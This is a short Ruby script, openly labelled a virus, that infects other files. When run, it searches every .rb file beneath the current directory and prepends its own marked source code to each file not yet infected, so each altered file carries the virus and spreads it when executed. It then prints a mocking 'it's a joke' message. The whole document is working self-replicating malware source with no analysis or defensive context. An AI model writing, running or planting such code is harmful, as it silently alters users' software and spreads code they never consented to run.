
#0x3a
#!/usr/bin/ruby
def infect_files
  count = 0
  virus_top     = '#0x3a'
  virus_bottom  = '#:'
  files = Dir["./**/*.rb"]

  files.each do |random_file|

    first_line = File.open(random_file, &:gets).strip

    if first_line != virus_top
      File.rename(random_file, 'tmp.rb')

      virus_file = File.open(__FILE__, "rb")
      virus_contents = ''

      virus_file.each_line do |line|
        virus_contents += line
        if line =~ /#{virus_bottom}/
          count += 1
          if count == 2 then break end
        end
      end

      File.open(random_file, 'w') {|f| f.write(virus_contents) }

      good_file = File.open('tmp.rb', 'rb')
      good_contents = good_file.read

      File.open(random_file, 'a') {|f| f.write(good_contents)}
      File.delete('tmp.rb')
    end
  end

  print "You just run a virus. Ha-ha-ha. It's a joke :)"
end

infect_files
#:
